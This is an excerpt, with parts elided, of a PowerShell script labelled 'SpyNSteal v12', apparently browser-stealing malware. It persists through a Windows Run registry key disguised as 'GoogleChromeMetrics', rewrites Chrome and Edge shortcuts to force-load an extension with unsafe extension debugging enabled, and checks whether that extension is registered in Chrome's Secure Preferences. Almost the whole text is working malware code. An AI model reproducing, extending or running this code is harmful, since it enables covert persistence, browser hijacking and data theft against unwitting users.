# SpyNSteal v12 - Permanent profile junction + pipe CDP
...
function Get-ChromeLaunchArgs([string]$profileDir, [string]$extDir) {
    return "--user-data-dir=`"$profileDir`" --restore-last-session --enable-unsafe-extension-debugging --load-extension=`"$extDir`""
}

function Install-ChromeLaunchHooks([string]$chromeExe, [string]$launchArgs) {
    $patched = 0
    $runName = "GoogleChromeMetrics"
    $runCmd = "`"$chromeExe`" $launchArgs"
    try {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runName -Value $runCmd -Force
        Log "Run key set: $runName"
        $patched++
        ...
        foreach ($dir in $dirs) {
            ...
            Get-ChildItem $dir -Filter "*.lnk" -Recurse -EA SilentlyContinue | ForEach-Object {
                try {
                    ...
                    $tp = $sc.TargetPath
                    if (-not $tp) { return }
                    if ($tp -notlike "*chrome.exe*" -and $tp -notlike "*msedge.exe*") { return }
                    if ($sc.Arguments -like "*User Data_Ext*") { return }
                    $sc.Arguments = $launchArgs
                    $sc.Save()
                    $patched++
                    Log "Patched: $($_.FullName)"
                } catch {}
            }
        }
    } catch { Log "Shortcut patch error: $_" }
    return $patched
}
...
if (Test-Path $prefsPath) {
    try {
        ...
        if ($extId) { $inPrefs = $content.Contains($extId) }
        Log "Extension in Secure Preferences: $inPrefs"
    } catch {}
}

$launchArgs = Get-ChromeLaunchArgs $profileDir $extDirAbs
Log "Launch args: $launchArgs"

$hookCount = Install-ChromeLaunchHooks $target.ExePath $launchArgs
...
Log "=== Done (extId=$extId, inPrefs=$inPrefs, profileDir=$profileDir, hooks=$hookCount) ==="
